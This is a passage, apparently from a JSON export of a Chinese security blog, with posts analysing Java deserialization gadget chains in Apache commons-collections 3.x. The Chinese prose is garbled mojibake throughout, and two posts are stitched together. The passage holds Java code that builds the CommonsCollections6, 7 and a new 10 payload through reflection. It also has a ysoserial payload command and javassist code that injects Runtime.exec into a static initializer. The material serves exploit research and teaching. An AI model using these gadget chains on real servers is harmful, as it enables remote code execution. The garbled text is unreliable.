Êàë‰ª¨ÈÉΩÁü•ÈÅìHashSetÈõÜÂêàÈáå‰∏ç‰ºöÂ≠òÂú®Áõ∏ÂêåÁöÑkeyÔºåÈÇ£‰πàÊòØÂ¶Ç‰ΩïÂà§Êñ≠ÊòØÂê¶ÊòØÁõ∏ÂêåÁöÑkeyÂë¢ÔºüËøôÈáåÂ∞±Ë¶ÅÁî®Âà∞keyÁöÑhashCodeÂáΩÊï∞‰∫ÜÔºåÂ¶ÇÊûúkeyÁöÑÂÄºÁõ∏ÂêåÔºåÂÖ∂hashCodeËøîÂõûÁöÑÂÄº‰πüÊòØÁõ∏ÂêåÁöÑ„ÄÇËøôÈáåÁöÑHashCodeÁöÑËÆ°ÁÆóÂú®HashSetÁöÑputÂíåaddÂáΩÊï∞ÂÆåÊàêÔºåÂπ∂‰∏îHashSet‰ªéÂ∫èÂàóÂåñÊï∞ÊçÆ‰∏≠ËøòÂéüÂá∫Êù•Êó∂‰ºöËá™Âä®Ë∞ÉÁî®putÂáΩÊï∞ÔºåËøôÈáåÂ∞±ÁªôÊàë‰ª¨Êèê‰æõ‰∫ÜÂèØÊéßÁöÑÂú∞Êñπ„ÄÇ ÂÖàÊù•Áúã‰∏Ä‰∏ãHashSetÁöÑreadObjectÂáΩÊï∞ ÁªßÁª≠Ë∑üputÂáΩÊï∞ÔºåËøôÈáåÂÖ∂ÂÆûË∞ÉÁî®ÁöÑÊòØHashMapÁöÑputÂáΩÊï∞ ÂÖ∂‰∏≠ÂØπkeyË∞ÉÁî®ÁöÑhash()ÂáΩÊï∞‰ºöË∞ÉÁî®key.hashCodeÂáΩÊï∞ÔºåÈÇ£‰πàÁé∞Âú®Â∞±ÂæàÊ∏ÖÊ•ö‰∫ÜÔºåÊàë‰ª¨Âè™Ë¶ÅÂ∞ÜkeyÁöÑÂÄºÊõøÊç¢ÊàêÊûÑÈÄ†Â•ΩÁöÑTiedMapEntryÂØπË±°Â∞±ÂèØ‰ª•‰∫Ü„ÄÇÊ≥®ÊÑèÔºåËøôÈáåÁöÑkeyÂÄºÂÖ∂ÂÆûÂ∞±ÊòØHashSet.addÁöÑÂÆû‰æãÔºåÂú®HashSetÈáåÁöÑHashMapÁ±ªÂ±ûÊÄßÂè™Áî®Âà∞‰∫ÜKey„ÄÇ Êï¥ÁêÜ‰∏Ä‰∏ãÂà©Áî®Èìæ 123456HashSet.readObject() -&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode -&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; ÂâçÊñáÊûÑÈÄ†ÁöÑRuntime.getRuntime().exec() 4. ÈáçÊñ∞ÊûÑÈÄ†ÂâçÂçäÈÉ®ÂàÜÂà©Áî®Èìæ‚ÄìCommonsCollections7CommonsCollections7Áî®‰∫ÜHashtableÊù•‰ª£ÊõøAnnotationInvocationHandlerÔºå‰∏çÂêå‰∫éÂâçÈù¢‰∏§ÁßçCommonsCollections7Âπ∂Êú™‰ΩøÁî®TiredMapEntryÔºåËÄåÊòØÁî®‰∫ÜÁõ∏ÂêåkeyÂÜ≤Á™ÅÁöÑÊñπÂºèË∞ÉÁî®equalsÊù•Ëß¶ÂèëLazy.getÂáΩÊï∞„ÄÇ ÂÖàÊù•Áúã‰∏Ä‰∏ãHashtableÁöÑreadObjectÂáΩÊï∞ ÁªßÁª≠Ë∑üËøõreconstitutionPut ËØ•ÂáΩÊï∞Â∞ÜÂ°´ÂÖÖtableÁöÑÂÜÖÂÆπÔºåÂÖ∂‰∏≠Á¨¨1236Ë°å‰ªÖÂΩìÊúâÈáçÂ§çÊï∞ÊçÆÂÜ≤Á™ÅÊó∂ÔºåÊâç‰ºöËøõÂÖ•‰∏ãÈù¢ÁöÑifËØ≠Âè•ÔºåËøôÈáåÊàë‰ª¨ÁªßÁª≠Ë∑üËøõequalsÂáΩÊï∞ ËøôÈáåÁöÑequalsÂáΩÊï∞ÂèñÂÜ≥‰∫ékeyÁöÑÂØπË±°ÔºåÂà©Áî®ÈìæÁî®ÁöÑÊòØLazyMapÂØπË±°ÔºåÂÆûÈôÖË∞ÉÁî®ÁöÑÊòØÁà∂Á±ªAbstractMapDecoratorÁöÑequalsÂáΩÊï∞ ËøôÈáåÂèàË∞ÉÁî®‰∫ÜmapÁöÑequalsÂáΩÊï∞ÔºåËøôÈáåÂÆûÈôÖË∞ÉÁî®ÁöÑÊòØHashMapÁöÑÁà∂Á±ªAbstractMapÁöÑequalsÂáΩÊï∞ Âú®Á¨¨495Ë°åË∞ÉÁî®‰∫Üm.getÂáΩÊï∞ÔºåÊâÄ‰ª•ÂêéÈù¢ÂèàÊòØÊàë‰ª¨ÁÜüÊÇâÁöÑLazyMap.getÁöÑÂ•óË∑Ø‰∫Ü„ÄÇ Êï¥ÁêÜ‰∏Ä‰∏ãÂà©Áî®Èìæ 123456Hashtable.readObject() -&gt; Hashtable.reconstitutionPut -&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals -&gt; m.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; ÂâçÊñáÊûÑÈÄ†ÁöÑRuntime.getRuntime().exec() 5. Âà©Áî®ÈìæÊûÑÈÄ†CommonsCollections6Âíå7ÁöÑexpÊûÑÈÄ†ÊØîËæÉÂ§çÊùÇÔºåËøôÈáåÂçïÁã¨ÊãøÂá∫Êù•ËÆ≤‰∏Ä‰∏ã„ÄÇ CommonsCollections6ÁªèËøáÂâçÈù¢ÁöÑÂàÜÊûêÔºåÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìCommonsCollections6ÈúÄË¶ÅÂ∞ÜÊûÑÈÄ†Â•ΩÁöÑTiedMapEntryÂÆû‰æãÊ∑ªÂä†Âà∞HashSetÁöÑÂÄº‰∏ä„ÄÇ ÁÆÄÂçïÁöÑÊñπÊ≥ïÂ∞±ÊòØÁõ¥Êé•add 123TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");HashSet map = new HashSet(1);map.add(entry); Â§çÊùÇ‰∏ÄÁÇπÔºåÂ∞±ÊòØysoserailÈáåÁöÑÂÆûÁé∞ÊñπÊ≥ïÔºåÈááÁî®ÂèçÂ∞ÑÊú∫Âà∂Êù•ÂÆåÊàê ÂÖ∂ÊÄùË∑Ø‰∏ªË¶Å‰∏∫Ôºö ÂÆû‰æãÂåñ‰∏Ä‰∏™HashSetÂÆû‰æã ÈÄöËøáÂèçÂ∞ÑÊú∫Âà∂Ëé∑ÂèñHashSetÁöÑmapÁ±ªÂ±ûÊÄß ÈÄöËøáÂèçÂ∞ÑÊú∫Âà∂Ëé∑ÂèñHashMap(mapÁ±ªÂ±ûÊÄß)ÁöÑtable(Node&lt;K,V&gt;)Á±ªÂ±ûÊÄß ÈÄöËøáÂèçÂ∞ÑÊú∫Âà∂Ëé∑ÂèñNodeÁöÑkeyÁ±ªÂ±ûÊÄßÔºåÂπ∂ËÆæÁΩÆËØ•keyÁöÑÂÄº‰∏∫ÊûÑÈÄ†Â•ΩÁöÑTiedMapEntryÂÆû‰æã ÂÖ∑‰Ωì‰ª£Á†ÅÂ¶Ç‰∏ã 12345678910111213141516171819202122232425262728293031323334HashSet map = new HashSet(1);map.add(\"foo\");Field f = null;try &#123; f = HashSet.class.getDeclaredField(\"map\");//Ëé∑ÂèñHashSetÁöÑmap FieldÂØπË±°&#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\");&#125;Permit.setAccessible(f);// ËÆæÁΩÆmapÂèØË¢´ËÆøÈóÆ‰øÆÊîπHashMap innimpl = null;innimpl = (HashMap) f.get(map);// Ëé∑ÂèñmapÂÆû‰æãÁöÑmapÁ±ªÂ±ûÊÄßField f2 = null;try &#123; f2 = HashMap.class.getDeclaredField(\"table\");// Ëé∑ÂèñHashMapÁöÑ table field&#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\");&#125;Permit.setAccessible(f2);// ËÆæÁΩÆHashMapÁöÑfield ÂèØË¢´ËÆøÈóÆObject[] array = new Object[0];array = (Object[]) f2.get(innimpl);Object node = array[0];// Ëé∑ÂèñNode&lt;k,v&gt;ÂÆû‰æãif(node == null)&#123; node = array[1];&#125;Field keyField = null;try&#123; keyField = node.getClass().getDeclaredField(\"key\");// Ëé∑ÂèñNodeÁöÑkey field&#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");&#125;Permit.setAccessible(keyField);// ËÆæÁΩÆËØ•FieldÂèØË¢´ËÆøÈóÆ‰øÆÊîπkeyField.set(node, entry);// ÂØπnodeÂÆû‰æãÂ°´ÂÖÖkeyÁöÑÂÄº‰∏∫TiedMapEntryÂÆû‰æã ÁªèËøá‰∏äÈù¢ÁöÑÊìç‰ΩúÔºåÊúÄÁªàÁöÑHashSetÂÆû‰æãË¢´Êàë‰ª¨ÂµåÂÖ•‰∫ÜÊûÑÈÄ†Â•ΩÁöÑTiedMapEntryÂÆû‰æã„ÄÇ ËøôÈáåÂú®Ë∞ÉËØïÁöÑËøáÁ®ã‰∏≠ÔºåÂèëÁé∞Áî®ysoserailÁöÑReflectionsÊù•ÁÆÄÂåñexpÔºåÂá∫Êù•ÁöÑÁªìÊûúÊúâÁÇπ‰∏ç‰∏ÄÊ†∑ÔºåËøòÊ≤°ÊúâÊâæÂà∞ÂÖ∑‰ΩìÁöÑÂéüÂõ†„ÄÇÂ¶ÇÊûúÊúâÂ∏àÂÇÖÈÅáÂà∞ËøáËøôÁßçÈóÆÈ¢òÔºåÊ¨¢Ëøé‰∏ÄËµ∑ËÆ®ËÆ∫ËÆ®ËÆ∫ÔºÅ CommonsCollections7CommonsCollectionsÂà©Áî®ÁöÑÊòØkeyÁöÑhashÂÜ≤Á™ÅÁöÑÊñπÊ≥ïÊù•Ëß¶ÂèëequalsÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞‰ºöË∞ÉÁî®LazyMap.getÂáΩÊï∞ ÈÇ£‰πàÊûÑÈÄ†expÁöÑÂÖ≥ÈîÆÂ∞±ÊòØÊûÑÈÄ†‰∏Ä‰∏™hashÂÜ≤Á™ÅÁöÑLazyMap‰∫Ü„ÄÇ ËøôÈáåÂ§ßÂÆ∂ÂèØ‰ª•Ë∑ü‰∏Ä‰∏ãString.hashCodeÂáΩÊï∞Ôºå‰ªñÁöÑËÆ°ÁÆóÊñπÊ≥ïÂ≠òÂú®‰∏çÂêåÂ≠óÁ¨¶‰∏≤Áõ∏ÂêåhashÁöÑÂèØËÉΩÊÄßÔºå‰æãÂ¶ÇÂ¶Ç‰∏ã‰ª£Á†Å CommonsCollections7Áî®ÁöÑÂ∞±ÊòØËøô‰∏™bugÊù•Âà∂ÈÄ†hashÂÜ≤Á™Å„ÄÇ ËøôÈáåÈúÄË¶ÅÊèê‰∏ÄÁÇπÁöÑÊòØËß¶ÂèëLazyMap.getÂáΩÊï∞ Ë¶ÅËµ∞Âà∞Á¨¨151Ë°åÁ∫¢Ê°ÜÊ°Ü‰∏äÔºåÈ¶ñÂÖàÈúÄË¶ÅÊª°Ë∂≥ÁöÑÊòØmapÈáå‰∏çÂ≠òÂú®ÂΩìÂâçËøô‰∏™key ‰ΩÜÊòØÊòéÊòæÂú®Á¨¨‰∏ÄÊ¨°‰∏çÂ≠òÂú®Ëøô‰∏™keyÂêéÔºå‰ºöÊõ¥Êñ∞mapÁöÑÈîÆÂÄºÔºåËøôÂ∞ÜÂØºËá¥‰∏ãÊ¨°ÂêåÊ†∑ÁöÑkeyËøõÊù•ÔºåÂ∞±‰∏ç‰ºöËß¶ÂèëÂêéÁª≠ÁöÑpayload‰∫Ü„ÄÇÊàë‰ª¨Âú®ÂÜôexpÁöÑÊó∂ÂÄôÈúÄË¶ÅÊ≥®ÊÑèÂà∞Ëøô‰∏ÄÁÇπ„ÄÇ Êù•Áúã‰∏Ä‰∏ãysoserialÁöÑCommonsCollections7ÊòØÊÄé‰πàÁºñÂÜôÁöÑÔºÅ 123456789101112131415161718Map innerMap1 = new HashMap();Map innerMap2 = new HashMap();// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObjectMap lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);lazyMap1.put(\"yy\", 1);Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);lazyMap2.put(\"zZ\", 1);// Use the colliding Maps as keys in HashtableHashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 2);Reflections.setFieldValue(transformerChain, \"iTransformers\", transformers);// Needed to ensure hash collision after previous manipulationslazyMap2.remove(\"yy\"); ÂÖ∂‰∏≠Á¨¨‰∏§Ê¨°ÁöÑput‰ºö‰ΩøÂæó‰ºö‰ΩøÂæóLazyMap2‰∏≠Â¢ûÂä†‰∫ÜyyËøô‰∏™ÈîÆÂÄºÔºå‰∏∫‰∫Ü‰øùËØÅÂèçÂ∫èÂàóÂåñÂêé‰ªçÁÑ∂ÂèØ‰ª•Ëß¶ÂèëÂêéÁª≠ÁöÑÂà©Áî®ÈìæÔºåËøôÈáåÈúÄË¶ÅÂ∞ÜlazyMap2ÁöÑyyÈîÆÂÄºremoveÊéâ„ÄÇ 6. ÊûÑÈÄ†Êñ∞CommonsCollections10ÁªèËøáÂØπÂâçÈù¢1,3,5,6,7ÁöÑÂàÜÊûêÔºåÊàë‰ª¨ÂÖ∂ÂÆûÂèØ‰ª•ÂèëÁé∞ÂæàÂ§öpayloadÈÉΩÊòØ‚ÄúÊùÇ‰∫§‚ÄùÁöÑÊàêÊûú„ÄÇÈÇ£‰πàÊàë‰ª¨ÊòØÂê¶ËÉΩÊ†πÊçÆÂâçÈù¢ÁöÑÂàÜÊûêÔºåÊûÑÈÄ†Âá∫‰∏Ä‰∏™Êñ∞ÁöÑCommonsCollectionsÁöÑpayloadÂë¢ÔºüÁ≠îÊ°àÂΩìÁÑ∂ÊòØËÇØÂÆöÁöÑÔºåÊé•‰∏ãÊù•ËÆ≤‰∏Ä‰∏ãÊàëÊâæÂà∞ÁöÑ‰∏Ä‰∏™Êñ∞payloadÂà©Áî®„ÄÇ Ëøô‰∏™payload‰∏∫CommonsCollections6Âíå7ÁöÑÁªìÂêàÔºåÂêåCommonsCollections6Á±ª‰ººÔºåËøôÈáå‰πüÁî®Âà∞‰∫ÜTiedMapEntryÁöÑhashCodeÂáΩÊï∞ Êàë‰ª¨Âú®ÂàÜÊûêHashtableÁöÑreconstitutionPutÂáΩÊï∞Êó∂ÔºåÁúã‰∏ãÂõæ ËØ•ÂáΩÊï∞Âú®Á¨¨1234Ë°åÂØπkeyË∞ÉÁî®‰∫Ü‰∏ÄÊ¨°hashCodeÂáΩÊï∞ÔºåÈÇ£‰πàÂæàÊòéÊòæÔºåÂ¶ÇÊûúkeyÂÄºË¢´‰ª£Êõø‰∏∫ÊûÑÈÄ†Â•ΩÁöÑTiedMapEntryÂÆû‰æãÔºåËøôÈáåÊàë‰ª¨Â∞±ËÉΩËß¶ÂèëLazyMap.getÂáΩÊï∞ÔºåÂêéÁª≠ÁöÑË∞ÉÁî®ÈìæÂ∞±Á±ª‰ºº‰∫Ü„ÄÇ Êï¥ÁêÜ‰∏Ä‰∏ãÂà©Áî®Èìæ 1234567Hashtable.readObject() -&gt; Hashtable.reconstitutionPut -&gt; key.hashCode() =&gt; TiedMapEntry.hashCode() -&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; ÂâçÊñáÊûÑÈÄ†ÁöÑRuntime.getRuntime().exec() ÂÖ∂ÂÆû‰ªéÂà©Áî®ÈìæÊù•ÁúãÔºå‰∏éCommonsCollections6ÁöÑÂå∫Âà´Âú®‰∫éÂâçÈÉ®ÁöÑËß¶Âèë‰ΩøÁî®‰∫Ü‰∏çÂêåÁöÑÂØπË±°„ÄÇ Êé•‰∏ãÊù•ÔºåÁªìÂêàÁ¨¨5ÁÇπÁöÑÂ≠¶‰π†ÔºåÊàë‰ª¨Êù•ÂÜô‰∏Ä‰∏ãËøô‰∏™payloadÁöÑÂà©Áî®Èìæexp 12345678910111213141516171819202122232425final Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);final Map innerMap = new HashMap();final Map innerMap2 = new HashMap();final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");Hashtable hashtable = new Hashtable();hashtable.put(\"foo\",1);// Ëé∑ÂèñhashtableÁöÑtableÁ±ªÂ±ûÊÄßField tableField = Hashtable.class.getDeclaredField(\"table\");Permit.setAccessible(tableField);Object[] table = (Object[])tableField.get(hashtable);Object entry1 = table[0];if(entry1==null) entry1 = table[1];// Ëé∑ÂèñHashtable.EntryÁöÑkeyÂ±ûÊÄßField keyField = entry1.getClass().getDeclaredField(\"key\");Permit.setAccessible(keyField);// Â∞ÜkeyÂ±ûÊÄßÁªôÊõøÊç¢ÊàêÊûÑÈÄ†Â•ΩÁöÑTiedMapEntryÂÆû‰æãkeyField.set(entry1, entry);// Â°´ÂÖÖÁúüÊ≠£ÁöÑÂëΩ‰ª§ÊâßË°å‰ª£Á†ÅReflections.setFieldValue(transformerChain, \"iTransformers\", transformers);return hashtable; 7. Ê¢ÖÂ≠êÈÖíÂ∏àÂÇÖÁöÑCommonsCollections9ÊâæÂà∞‰∏äÈù¢CommonsCollections10Êó∂ÔºåÂú®ÁΩë‰∏äÊâæ‰∫Ü‰∏Ä‰∏ãÊúâÊ≤°ÊúâÂ∏àÂÇÖÂ∑≤ÁªèÊåñÂà∞Ëøá‰∫ÜÔºå‰∏ÄÂÖ±ÊâæÂà∞‰∏ãÈù¢‰∏â‰ΩçÂ∏àÂÇÖ https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d https://github.com/frohoff/ysoserial/pull/116 ‰∏Ä‰∏™‰∏Ä‰∏™Êù•ËØ¥ Á¨¨‰∏Ä‰∏™Jayl1nÂ∏àÂÇÖÂÅöÁöÑÊîπÂèò‰∏ªË¶ÅÊòØÊúÄÁªàÁöÑRuntime.getRuntime().execÊîπÊàê‰∫ÜURLClassLoader.loadClass().newInstanceÁöÑÊñπÂºèÔºåÂâçÈù¢Áî®ÁöÑËøòÊòØCommonsCollections6ÔºåËøôÈáåÊöÇÊó∂‰∏çÂ∞ÜÂÖ∂ÂΩíÁ±ª‰∏∫Êñ∞ÁöÑÂà©Áî®Èìæ„ÄÇ Á¨¨‰∫å‰∏™ÊòØÊ¢ÖÂ≠êÈÖíÂ∏àÂÇÖÊèê‰∫§ÁöÑCommonsCollections9Ôºå‰∏ªË¶ÅÂà©Áî®ÁöÑÊòØCommonsCollections:3.2ÁâàÊú¨Êñ∞Â¢ûÁöÑDefaultedMapÊù•‰ª£ÊõøLazyMapÔºåÂõ†‰∏∫Ëøô‰∏§‰∏™MapÊúâÂêåÊ†∑ÁöÑgetÂáΩÊï∞ÂèØ‰ª•Ë¢´Âà©Áî®ÔºåËøôÈáå‰∏çÂÜçÂÖ∑‰ΩìÂàÜÊûê„ÄÇ Á¨¨‰∏â‰∏™ÊòØnavalorenzoÂ∏àÂÇÖÊèê‰∫§ÁöÑCommonsCollections8ÔºåÂÖ∂Âà©Áî®ÈìæÂü∫‰∫éCommonsCollections:4.0ÁâàÊú¨ÔºåÊöÇÊó∂‰∏çÂú®Êú¨ÁØáÊñáÁ´†ÁöÑÂàÜÊûêËåÉÂõ¥ÂÜÖÔºåÂêéÈù¢‰ºöÂ•ΩÂ•ΩÂàÜÊûê‰∏Ä‰∏ã„ÄÇ 0x03 ÊÄªÁªìËÅîÂêàÂâçÈù¢‰∏§ÁØáÊñáÁ´†CommonsCollections1„ÄÅCommonsCollections3ÔºåÂú®Âä†‰∏äÊú¨ÊñáÁöÑCommonsCollections5Ôºå6Ôºå7Ôºå9Ôºå10„ÄÇ Áî±‰∫éÁΩë‰∏äÂ∑≤ÁªèÊúâÁ±ª‰ººÁöÑÊñáÁ´†ÂÅö‰∫ÜÊÄªÁªìÔºåËøôÈáåÂ∞±ÁÆÄÂçïÂÅö‰∏Ä‰∏ãCommonsCollections&lt;=3.2.1‰∏ãÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÁöÑÊÄªÁªì„ÄÇ Ëµ∑ÂßãÁÇπ AnnotationInvocationHandlerÁöÑreadObject BadAttributeValueExpExceptionÁöÑreadObject HashSetÁöÑreadObject HashtableÁöÑreadObject ÈáçË¶ÅÁöÑÊâøÊé•ÁÇπ LazyMapÁöÑget DefaultedMapÁöÑget TiedMapEntryÁöÑgetValue ProxyÁöÑinvoke ÁªàÁÇπ ChainedTransformerÁöÑtransform InvokerTransformerÁöÑtransform ConstantTransformerÁöÑtransform ÂêÑexpÁöÑjdkÈÄÇÁî®ÁâàÊú¨ jdk7 =&gt; CommonsCollection1„ÄÅ3 jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10 ÂêÑexpÁöÑcommons-collectionsÈÄÇÁî®ÁâàÊú¨ commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10 commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10 ÊúÄÂêéÁöÑÊúÄÂêéÔºåcommons-collections:3.xÁâàÊú¨ÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÂ∞±ÂàÜÊûêÂà∞ËøôÈáåÔºåÂÖ∂ÂÆûÊàëÁõ∏‰ø°Â¶ÇÊûúÊÉ≥ÁªßÁª≠ÊåñÂèØ‰ª£ÊõøÁöÑÂà©Áî®ÈìæËøòÊòØ‰ºöÊúâÁöÑÔºåÂ∞±ÂÉèÊú¨ÊñáÊåñÂà∞ÁöÑCommonsCollections10ÔºåÂ¶ÇÊûúÂêÑ‰ΩçÂ∏àÂÇÖÊúâÂÖ¥Ë∂£ÂèØ‰ª•ÁªßÁª≠Êåñ‰∏ãÂéªÔºå‰πüÊ¨¢ËøéÂíåÂêÑ‰ΩçÂ∏àÂÇÖ‰∏ÄËµ∑‰∫§ÊµÅ„ÄÇ ÂêéÁª≠Ëøò‰ºöÊääcommons-collections:4ÁâàÊú¨ÁöÑÂà©Áî®ÈìæÂÅö‰∏Ä‰∏™ÂàÜÊûêÔºåÊ¨¢Ëøé‰∏ÄËµ∑‰∫§ÊµÅÔºöÔºâ"},{"title":"„Äênotes„ÄëJavaÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò‰πãCommonsCollections3","permalink":"http://blog.0kami.cn/2019/10/28/java/study-java-deserialized-commonscollections3-3/","text":"0x00 ÂâçË®ÄÂâçÈù¢ÂàÜÊûê‰∫ÜysoserialÁöÑCommonsCollections1ÔºåÁÜüÊÇâ‰∫Ü‰∏ÄÁÇπJavaÂèçÂ∫èÂàóÂåñ„ÄÇÊú¨ÊñáÂ∞ÜÁªßÁª≠ÂàÜÊûêysoserialÁöÑÂà©Áî®Ôºå‰ªäÂ§©ÁöÑ‰∏ªËßíÊòØCommonsCollections3. 0x01 ÁéØÂ¢ÉÂáÜÂ§áÈ¶ñÂÖàÁî±‰∫éoverrideÁöÑÂéüÂõ†ÔºåÁéØÂ¢É‰ΩøÁî®ÁöÑÊòØjdk7u80„ÄÇÂà©Áî®ysoserialÁîüÊàêpayloadÔºåÂπ∂ËΩΩÂÖ•Ë∞ÉËØï„ÄÇ 1java -jar ysoserial-master-30099844c6-1.jar CommonsCollections3 \"open /System/Applications/Calculator.app\" &gt; commonscollections3.ser 0x02 Âü∫Á°ÄÁü•ËØÜÂú®ÂàÜÊûêÂºÄÂßãÂâçÔºåÂÖàË°•ÂÖÖ‰∏Ä‰∏ãÂü∫Á°ÄÁü•ËØÜ 12public class StaticBlockTest &#123;&#125; 12345678910111213141516171819202122public class Cracker &#123; public static byte[] generate()&#123; try &#123; String code = \"&#123;java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");&#125;\"; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(StaticBlockTest.class.getName()); clazz.setName(\"demo\"); clazz.makeClassInitializer().insertAfter(code); return clazz.toBytecode(); // ... &#125; public static void main(String[] args) &#123; byte[] clazz = generate(); DefiningClassLoader loader = new DefiningClassLoader(); Class cls = loader.defineClass(\"demo\",clazz);// ‰ªéÂ≠óËäÇÊï∞ÁªÑ‰∏≠ÊÅ¢Â§çÁ±ª try &#123; cls.newInstance(); // ÂÆû‰æãÂåñËØ•Á±ªÊó∂‰ºöËá™Âä®Ë∞ÉÁî®ÈùôÊÄÅÂùóÂÜÖÁöÑ‰ª£Á†Å &#125; // ... &#125;&#125; ÈÄöËøá‰∏äÈù¢Ëøô‰∏™‰æãÂ≠êÔºåÊàë‰ª¨ÂèØ‰ª•Ëé∑ÂæóÁöÑÁü•ËØÜÁÇπ‰∏ªË¶Å‰∏∫‰∏§ÁÇπÔºö ‚Äã a. defineClassÂèØ‰ª•‰ªébyteÊï∞ÁªÑ‰∏≠ÊÅ¢Â§ç‰∏Ä‰∏™Class ‚Äã b. static initializerÂú®Á±ªËΩΩÂÖ•Êó∂Â∞ÜËá™Âä®ÊâßË°åÔºàÈùôÊÄÅÂùóÂÜÖÁöÑ‰ª£Á†ÅÔºâ Java‰∏≠Âä®ÊÄÅË∞ÉÁî®ÁöÑÂè¶‰∏ÄÁßçÊñπÂºèÊòØdefineClass JavaÊèê‰æõ‰∫ÜClassLoader‰ªébytesÊï∞ÁªÑ‰∏≠ËøòÂéüClassÁöÑÊñπÊ≥ïÔºådefineClassÂáΩÊï∞Â∞±ÊòØÂÆåÊàêËøô‰∏ÄËøáÁ®ãÁöÑÂáΩÊï∞„ÄÇ ÁêÜËÆ∫‰∏äÔºåÂ¶ÇÊûú‰ª£Á†Å‰∏≠‰ΩøÁî®‰∫ÜËøôÁßçÊñπÂºèÔºå‰∏îbyteÊï∞ÊçÆÁöÑÂÜÖÂÆπÂèØÊéßÔºåÊàë‰ª¨ÂèØ‰ª•ÊâßË°å‰ªªÊÑèJava‰ª£Á†Å„ÄÇ‰∏∫‰ªÄ‰πàÂë¢Ôºü ËøôÈáåÂ∞±Áî®Âà∞‰∫ÜJavaÁ±ªÁöÑÂè¶‰∏Ä‰∏™ÁâπÊÄßÔºåstatic blockÂú®Á±ªËΩΩÂÖ•Êó∂Ëá™Âä®ÊâßË°åÂùóÂÜÖÁöÑ‰ª£Á†Å„ÄÇÊàë‰ª¨ÂèØ‰ª•ÈÄöËøájavassistÂØπÈùôÊÄÅÂùóÊ≥®ÂÖ•‰ªªÊÑè‰ª£Á†ÅÔºåËØ•Á±ªË¢´ÊÅ¢Â§çÂπ∂ËΩΩÂÖ•Êó∂‰ºöË∞ÉÁî®Ê≥®ÂÖ•ÁöÑ‰ª£Á†ÅÔºåÂêéÊñáÁöÑÂà©Áî®Èìæ‰∏ªË¶ÅÂ∞±ÊòØÁî®Âà∞‰∫ÜËøô‰∏§‰∏™Áü•ËØÜÁÇπ„ÄÇ 0x03 Âà©Áî®ÈìæÂàÜÊûê1. ÂâçÊôØÂõûÈ°æËøôÈáåÈÄâÊã©CommonsCollections3ÊòØÂõ†‰∏∫‰ªñÁöÑÂâçÂçäÊÆµËß¶ÂèëÁöÑÂà©Áî®ÈìæË∑üCommonsCollections1ÊòØ‰∏ÄÊ†∑ÁöÑÔºåÊâÄ‰ª•ËøôÈáåÂè™ÈúÄË¶ÅÂàÜÊûêÂêéÂçäÊÆµÂëΩ‰ª§ÊâßË°åÁöÑÊûÑÈÄ†Âç≥ÂèØ„ÄÇÂõûÈ°æ‰∏Ä‰∏ãÂâçÂçäÊÆµÂà©Áî®Èìæ 123456sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValues.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; memberValues.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; iTransformers[].transform() CommonsCollections1‰∏≠ChainedTransformer.transform()‰ºöÂæ™ÁéØË∞ÉÁî®iTransformersÊï∞ÁªÑÈáåÁöÑÂØπË±°ÁöÑtransformÂáΩÊï∞„ÄÇCommonsCollections1Áî®ÁöÑÊòØInvokerTransformerÁöÑtransformÔºåÂõ†‰∏∫ËØ•ÂáΩÊï∞ÂÆûÁé∞‰∫ÜÂèçÂ∞ÑË∞ÉÁî®‰ªªÊÑèÁ±ªÁöÑÂäüËÉΩ„ÄÇÈÇ£‰πàÈô§‰∫Ü‰ΩøÁî®InvokerTransformerËøòÊúâÊ≤°ÊúâÂÖ∂‰ªñÁöÑÊñπÊ≥ïÔºüÁ≠îÊ°àÂΩìÁÑ∂ÊòØËÇØÂÆöÁöÑÔºÅ 2. Êñ∞ÁöÑÂëΩ‰ª§ÊâßË°åÂà©Áî®ÈìæÊù•Áúã‰∏Ä‰∏ãCommonsCollections3ÁöÑpayloadsÊûÑÈÄ† 123456789Object templatesImpl = Gadgets.createTemplatesImpl(command);// real chain for after setupfinal Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] &#123; Templates.class &#125;, new Object[] &#123; templatesImpl &#125; )&#125;;// ÂêéÁª≠Á±ª‰ºº ÁúÅÁï• 